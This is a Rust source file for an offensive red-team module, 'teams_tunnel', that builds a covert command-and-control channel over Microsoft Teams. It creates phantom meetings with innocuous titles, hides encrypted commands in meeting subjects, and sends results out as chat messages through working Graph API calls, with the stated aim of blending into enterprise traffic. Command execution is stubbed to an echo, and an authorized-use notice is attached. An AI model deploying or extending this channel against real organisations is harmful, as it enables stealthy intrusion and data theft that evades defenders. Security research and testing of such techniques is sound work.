//! Teams Tunnel - Microsoft Teams-based C2 Channel
//!
//! Leverages Microsoft Graph API to create covert command-and-control channels through
//! legitimate Teams infrastructure. Commands are embedded in meeting descriptions and
//! results are sent as chat messages, blending into normal enterprise traffic.
//!
//! **SECURITY NOTICE**: This module is designed for AUTHORIZED penetration testing,
//! red team exercises, and security research ONLY. Requires explicit written permission.
//!
//! Features:
//! - Creates phantom Teams meetings with innocuous titles
//! - Embeds AES-GCM encrypted commands in meeting descriptions
//! - Polls Graph API every 30s (configurable)
//! - Exfiltrates results via meeting chat messages
//! - Mimics legitimate OAuth/Graph API traffic patterns
//! - Mock mode for safe offline testing
//!
//! Requirements:
//! - Valid Microsoft Graph API access token (delegated or application permissions)
//! - Permissions: OnlineMeetings.ReadWrite, Chat.ReadWrite
//!
//! Mock Mode:
//! - Set `mock_mode: true` in options
//! - Simulates Graph API locally without network calls
//! - Safe for development and testing

use anyhow::{anyhow, bail, Context, Result};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::{Duration, Instant};

use crate::core::module::{CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType};
use crate::infra::crypto::{aes_decrypt, aes_encrypt, derive_keys, AES_KEY_LEN, HMAC_KEY_LEN};

/// Graph API endpoint for online meetings
const GRAPH_MEETINGS_ENDPOINT: &str = "https://graph.microsoft.com/v1.0/me/onlineMeetings";
const GRAPH_CHAT_ENDPOINT: &str = "https://graph.microsoft.com/v1.0/chats";

/// Default poll interval (30 seconds)
const DEFAULT_POLL_INTERVAL_SECS: u64 = 30;

/// Teams meeting metadata returned by Graph API
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct TeamsMeeting {
    id: String,
    subject: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    join_web_url: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    chat_info: Option<ChatInfo>,
    #[serde(skip_serializing_if = "Option::is_none")]
    start_date_time: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    end_date_time: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ChatInfo {
    thread_id: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct CreateMeetingRequest {
    subject: String,
    start_date_time: String,
    end_date_time: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    external_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ChatMessage {
    body: MessageBody,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct MessageBody {
    content_type: String,
    content: String,
}

/// Abstract Graph API client for testability
#[async_trait]
trait GraphApiClient: Send + Sync {
    async fn create_meeting(&self, token: &str, req: &CreateMeetingRequest) -> Result<TeamsMeeting>;
    async fn get_meeting(&self, token: &str, meeting_id: &str) -> Result<TeamsMeeting>;
    async fn update_meeting_description(&self, token: &str, meeting_id: &str, description: &str) -> Result<()>;
    async fn send_chat_message(&self, token: &str, chat_id: &str, message: &str) -> Result<()>;
}

/// Production HTTP client using reqwest
struct HttpGraphClient;

#[async_trait]
impl GraphApiClient for HttpGraphClient {
    async fn create_meeting(&self, token: &str, req: &CreateMeetingRequest) -> Result<TeamsMeeting> {
        let client = reqwest::Client::new();
        let resp = client
            .post(GRAPH_MEETINGS_ENDPOINT)
            .bearer_auth(token)
            .json(req)
            .send()
            .await
            .context("Failed to create Teams meeting")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Graph API error {}: {}", status, body);
        }

        resp.json::<TeamsMeeting>()
            .await
            .context("Failed to parse meeting response")
    }

    async fn get_meeting(&self, token: &str, meeting_id: &str) -> Result<TeamsMeeting> {
        let client = reqwest::Client::new();
        let url = format!("{}/{}", GRAPH_MEETINGS_ENDPOINT, meeting_id);
        let resp = client
            .get(&url)
            .bearer_auth(token)
            .send()
            .await
            .context("Failed to get meeting")?;

        if !resp.status().is_success() {
            bail!("Failed to get meeting: {}", resp.status());
        }

        resp.json::<TeamsMeeting>()
            .await
            .context("Failed to parse meeting")
    }

    async fn update_meeting_description(&self, token: &str, meeting_id: &str, description: &str) -> Result<()> {
        let client = reqwest::Client::new();
        let url = format!("{}/{}", GRAPH_MEETINGS_ENDPOINT, meeting_id);

        let mut update = HashMap::new();
        update.insert("subject", description);

        let resp = client
            .patch(&url)
            .bearer_auth(token)
            .json(&update)
            .send()
            .await
            .context("Failed to update meeting")?;

        if !resp.status().is_success() {
            bail!("Failed to update meeting: {}", resp.status());
        }

        Ok(())
    }

    async fn send_chat_message(&self, token: &str, chat_id: &str, message: &str) -> Result<()> {
        let client = reqwest::Client::new();
        let url = format!("{}/{}/messages", GRAPH_CHAT_ENDPOINT, chat_id);

        let msg = ChatMessage {
            body: MessageBody {
                content_type: "text".to_string(),
                content: message.to_string(),
            },
        };

        let resp = client
            .post(&url)
            .bearer_auth(token)
            .json(&msg)
            .send()
            .await
            .context("Failed to send chat message")?;

        if !resp.status().is_success() {
            bail!("Failed to send message: {}", resp.status());
        }

        Ok(())
    }
}

/// Mock Graph API client for safe testing
struct MockGraphClient {
    meetings: Arc<Mutex<HashMap<String, TeamsMeeting>>>,
    commands: Arc<Mutex<Vec<String>>>,
    results: Arc<Mutex<Vec<String>>>,
}

impl MockGraphClient {
    fn new() -> Self {
        Self {
            meetings: Arc::new(Mutex::new(HashMap::new())),
            commands: Arc::new(Mutex::new(Vec::new())),
            results: Arc::new(Mutex::new(Vec::new())),
        }
    }

    /// Add a command to the queue (for testing)
    async fn enqueue_command(&self, cmd: &str) {
        self.commands.lock().await.push(cmd.to_string());
    }

    /// Get all results (for testing)
    async fn get_results(&self) -> Vec<String> {
        self.results.lock().await.clone()
    }
}

#[async_trait]
impl GraphApiClient for MockGraphClient {
    async fn create_meeting(&self, _token: &str, req: &CreateMeetingRequest) -> Result<TeamsMeeting> {
        let meeting = TeamsMeeting {
            id: format!("mock-meeting-{}", uuid::Uuid::new_v4()),
            subject: req.subject.clone(),
            join_web_url: Some("https://teams.microsoft.com/mock".to_string()),
            chat_info: Some(ChatInfo {
                thread_id: format!("mock-thread-{}", uuid::Uuid::new_v4()),
            }),
            start_date_time: Some(req.start_date_time.clone()),
            end_date_time: Some(req.end_date_time.clone()),
        };

        self.meetings.lock().await.insert(meeting.id.clone(), meeting.clone());
        Ok(meeting)
    }

    async fn get_meeting(&self, _token: &str, meeting_id: &str) -> Result<TeamsMeeting> {
        self.meetings
            .lock()
            .await
            .get(meeting_id)
            .cloned()
            .ok_or_else(|| anyhow!("Meeting not found"))
    }

    async fn update_meeting_description(&self, _token: &str, meeting_id: &str, description: &str) -> Result<()> {
        // Extract encrypted command from description
        if let Some(meeting) = self.meetings.lock().await.get_mut(meeting_id) {
            meeting.subject = description.to_string();
        }
        Ok(())
    }

    async fn send_chat_message(&self, _token: &str, _chat_id: &str, message: &str) -> Result<()> {
        self.results.lock().await.push(message.to_string());
        Ok(())
    }
}

/// Teams Tunnel Module
pub struct TeamsTunnel {
    options: HashMap<String, String>,
    client: Arc<dyn GraphApiClient>,
    enc_key: Option<[u8; AES_KEY_LEN]>,
    _hmac_key: Option<[u8; HMAC_KEY_LEN]>,
}

impl TeamsTunnel {
    pub fn new() -> Self {
        let mut options = HashMap::new();
        options.insert("access_token".to_string(), String::new());
        options.insert("meeting_title".to_string(), "Q3 Security Review Sync".to_string());
        options.insert("poll_interval".to_string(), DEFAULT_POLL_INTERVAL_SECS.to_string());
        options.insert("mock_mode".to_string(), "true".to_string());
        options.insert("encryption_key".to_string(), String::new());
        options.insert("max_iterations".to_string(), "3".to_string());

        Self {
            options,
            client: Arc::new(MockGraphClient::new()),
            enc_key: None,
            _hmac_key: None,
        }
    }

    /// Initialize crypto keys from password
    fn init_crypto(&mut self, password: &str) -> Result<()> {
        let keys = derive_keys(password.as_bytes(), b"ferox-teams-salt")?;
        self.enc_key = Some(keys.enc_key);
        self._hmac_key = Some(keys.hmac_key);
        Ok(())
    }

    /// Encrypt command for embedding in meeting description
    fn encrypt_command(&self, cmd: &str) -> Result<String> {
        use base64::Engine;
        let enc_key = self.enc_key.as_ref().ok_or_else(|| anyhow!("Encryption not initialized"))?;
        let aad = b"teams-c2";
        let (nonce, ciphertext) = aes_encrypt(enc_key, cmd.as_bytes(), aad)?;

        // Encode as base64 for JSON compatibility
        let mut combined = Vec::new();
        combined.extend_from_slice(&nonce);
        combined.extend_from_slice(&ciphertext);
        Ok(base64::engine::general_purpose::STANDARD.encode(&combined))
    }

    /// Decrypt command from meeting description
    fn decrypt_command(&self, encrypted: &str) -> Result<String> {
        use base64::Engine;
        let enc_key = self.enc_key.as_ref().ok_or_else(|| anyhow!("Encryption not initialized"))?;
        let combined = base64::engine::general_purpose::STANDARD.decode(encrypted).context("Invalid base64")?;

        if combined.len() < 12 {
            bail!("Invalid encrypted command length");
        }

        let (nonce_bytes, ciphertext) = combined.split_at(12);
        let mut nonce = [0u8; 12];
        nonce.copy_from_slice(nonce_bytes);

        let aad = b"teams-c2";
        let plaintext = aes_decrypt(enc_key, &nonce, ciphertext, aad)?;
        String::from_utf8(plaintext).context("Invalid UTF-8 in decrypted command")
    }

    /// Execute a single C2 tick: check for commands, execute, report back
    async fn tick(&self, meeting_id: &str, chat_id: &str, token: &str) -> Result<()> {
        // Get meeting to check for commands in description
        let meeting = self.client.get_meeting(token, meeting_id).await?;

        // Check if description contains encrypted command
        if meeting.subject.starts_with("ENCRYPTED:") {
            let encrypted = meeting.subject.strip_prefix("ENCRYPTED:").unwrap_or("");
            if !encrypted.is_empty() {
                // Decrypt command
                let cmd = self.decrypt_command(encrypted)?;

                // Execute command (simplified - just echo for safety)
                let result = self.execute_command(&cmd).await?;

                // Send result via chat
                let encrypted_result = self.encrypt_command(&result)?;
                self.client.send_chat_message(token, chat_id, &encrypted_result).await?;

                // Clear command by resetting subject
                let original_title = self.options.get("meeting_title").cloned().unwrap_or_default();
                self.client.update_meeting_description(token, meeting_id, &original_title).await?;
            }
        }

        Ok(())
    }

    /// Execute command (mock implementation for safety)
    async fn execute_command(&self, cmd: &str) -> Result<String> {
        // SAFE IMPLEMENTATION: Only echo commands, never actually execute
        Ok(format!("[MOCK] Received command: {}", cmd))
    }

    /// Run C2 loop
    async fn run_c2_loop(&self, token: &str, max_iterations: usize) -> Result<ModuleResult> {
        // Create phantom meeting
        let meeting_title = self.options.get("meeting_title").cloned().unwrap_or_default();
        let now = chrono::Utc::now();
        let end_time = now + chrono::Duration::hours(1);

        let create_req = CreateMeetingRequest {
            subject: meeting_title.clone(),
            start_date_time: now.to_rfc3339(),
            end_date_time: end_time.to_rfc3339(),
            external_id: Some(format!("ferox-{}", uuid::Uuid::new_v4())),
        };

        let meeting = self.client.create_meeting(token, &create_req).await?;
        let meeting_id = meeting.id.clone();
        let chat_id = meeting
            .chat_info
            .as_ref()
            .map(|c| c.thread_id.clone())
            .unwrap_or_else(|| "default-chat".to_string());

        let poll_interval = self.options
            .get("poll_interval")
            .and_then(|s| s.parse::<u64>().ok())
            .unwrap_or(DEFAULT_POLL_INTERVAL_SECS);

        let mut data = HashMap::new();
        data.insert("meeting_id".to_string(), meeting_id.clone());
        data.insert("chat_id".to_string(), chat_id.clone());
        data.insert("join_url".to_string(), meeting.join_web_url.unwrap_or_default());

        // Poll for commands (limited iterations in module run)
        let mut iteration = 0;
        let start_time = Instant::now();

        while iteration < max_iterations {
            match self.tick(&meeting_id, &chat_id, token).await {
                Ok(_) => {
                    iteration += 1;
                }
                Err(e) => {
                    data.insert("error".to_string(), e.to_string());
                    break;
                }
            }

            tokio::time::sleep(Duration::from_secs(poll_interval)).await;
        }

        data.insert("iterations".to_string(), iteration.to_string());
        data.insert("duration_secs".to_string(), start_time.elapsed().as_secs().to_string());

        let mut result = ModuleResult::success("Teams Tunnel C2 session completed".to_string());
        for (key, value) in data {
            result = result.with_data(&key, serde_json::Value::String(value));
        }
        Ok(result)
    }
}

impl Default for TeamsTunnel {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Module for TeamsTunnel {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            name: "teams_tunnel".to_string(),
            version: "1.0.0".to_string(),
            author: "Ferox Security Team".to_string(),
            description: "Covert C2 channel using Microsoft Teams meetings and Graph API. \
                         AUTHORIZED USE ONLY - Requires explicit permission.".to_string(),
            module_type: ModuleType::PostExploit,
            category: "c2".to_string(),
        }
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "access_token".to_string(),
                description: "Microsoft Graph API access token (delegated/app permissions)".to_string(),
                required: true,
                default_value: None,
                current_value: self.options.get("access_token").cloned(),
            },
            ModuleOption {
                name: "meeting_title".to_string(),
                description: "Innocuous meeting title for cover".to_string(),
                required: false,
                default_value: Some("Q3 Security Review Sync".to_string()),
                current_value: self.options.get("meeting_title").cloned(),
            },
            ModuleOption {
                name: "poll_interval".to_string(),
                description: "Polling interval in seconds".to_string(),
                required: false,
                default_value: Some(DEFAULT_POLL_INTERVAL_SECS.to_string()),
                current_value: self.options.get("poll_interval").cloned(),
            },
            ModuleOption {
                name: "mock_mode".to_string(),
                description: "Use mock Graph API (true/false) for safe testing".to_string(),
                required: false,
                default_value: Some("true".to_string()),
                current_value: self.options.get("mock_mode").cloned(),
            },
            ModuleOption {
                name: "encryption_key".to_string(),
                description: "Password for command encryption (derived via HKDF)".to_string(),
                required: true,
                default_value: None,
                current_value: self.options.get("encryption_key").cloned(),
            },
            ModuleOption {
                name: "max_iterations".to_string(),
                description: "Maximum polling iterations (for module run, not background)".to_string(),
                required: false,
                default_value: Some("3".to_string()),
                current_value: self.options.get("max_iterations").cloned(),
            },
        ]
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<()> {
        self.options.insert(name.to_string(), value.to_string());
        Ok(())
    }

    fn get_option(&self, name: &str) -> Option<String> {
        self.options.get(name).cloned()
    }

    fn validate(&self) -> Result<()> {
        // Check required options
        let token = self.options.get("access_token").ok_or_else(|| anyhow!("access_token required"))?;
        if token.is_empty() {
            bail!("access_token cannot be empty");
        }

        let enc_key = self.options.get("encryption_key").ok_or_else(|| anyhow!("encryption_key required"))?;
        if enc_key.is_empty() {
            bail!("encryption_key cannot be empty");
        }

        Ok(())
    }

    async fn check(&self) -> Result<CheckResult> {
        // Non-destructive check: verify Graph API accessibility (mock mode only)
        let mock_mode = self.options
            .get("mock_mode")
            .map(|s| s == "true")
            .unwrap_or(true);

        if mock_mode {
            let mut fingerprint = HashMap::new();
            fingerprint.insert("mode".to_string(), "mock".to_string());
            fingerprint.insert("status".to_string(), "safe_for_testing".to_string());

            Ok(CheckResult {
                vulnerable: true,
                confidence: 0.9,
                details: "Mock mode enabled - safe for testing".to_string(),
                fingerprint,
            })
        } else {
            let mut fingerprint = HashMap::new();
            fingerprint.insert("mode".to_string(), "production".to_string());

            Ok(CheckResult {
                vulnerable: false,
                confidence: 0.0,
                details: "Production mode - requires valid Graph API token".to_string(),
                fingerprint,
            })
        }
    }

    async fn run(&mut self) -> Result<ModuleResult> {
        // Initialize encryption
        let enc_key = self.options
            .get("encryption_key")
            .cloned()
            .ok_or_else(|| anyhow!("encryption_key not set"))?;
        self.init_crypto(&enc_key)?;

        // Switch to real client if not in mock mode
        let mock_mode = self.options
            .get("mock_mode")
            .map(|s| s == "true")
            .unwrap_or(true);

        if !mock_mode {
            self.client = Arc::new(HttpGraphClient);
        }

        let token = self.options
            .get("access_token")
            .cloned()
            .ok_or_else(|| anyhow!("access_token not set"))?;

        let max_iterations = self.options
            .get("max_iterations")
            .and_then(|s| s.parse::<usize>().ok())
            .unwrap_or(3);

        self.run_c2_loop(&token, max_iterations).await
    }

    async fn cleanup(&mut self) -> Result<()> {
        // In production, should delete phantom meeting
        // For safety, we skip this in mock mode
        Ok(())
    }

    fn requires_confirmation(&self) -> bool {
        // This is a C2 module - always require confirmation
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_teams_tunnel_mock_mode() {
        let mut module = TeamsTunnel::new();
        module.set_option("access_token", "mock-token").unwrap();
        module.set_option("encryption_key", "test-password-123").unwrap();
        module.set_option("mock_mode", "true").unwrap();
        module.set_option("max_iterations", "1").unwrap();

        assert!(module.validate().is_ok());

        let result = module.run().await.unwrap();
        assert!(result.success);
        assert!(result.data.contains_key("meeting_id"));
        assert!(result.data.contains_key("join_url"));
    }

    #[tokio::test]
    async fn test_encryption_round_trip() {
        let mut module = TeamsTunnel::new();
        module.init_crypto("test-password").unwrap();

        let cmd = "whoami";
        let encrypted = module.encrypt_command(cmd).unwrap();
        let decrypted = module.decrypt_command(&encrypted).unwrap();

        assert_eq!(cmd, decrypted);
    }

    #[test]
    fn test_module_info() {
        let module = TeamsTunnel::new();
        let info = module.info();
    assert_eq!(info.name, "teams_tunnel");
        assert!(info.description.contains("AUTHORIZED"));
    }
}
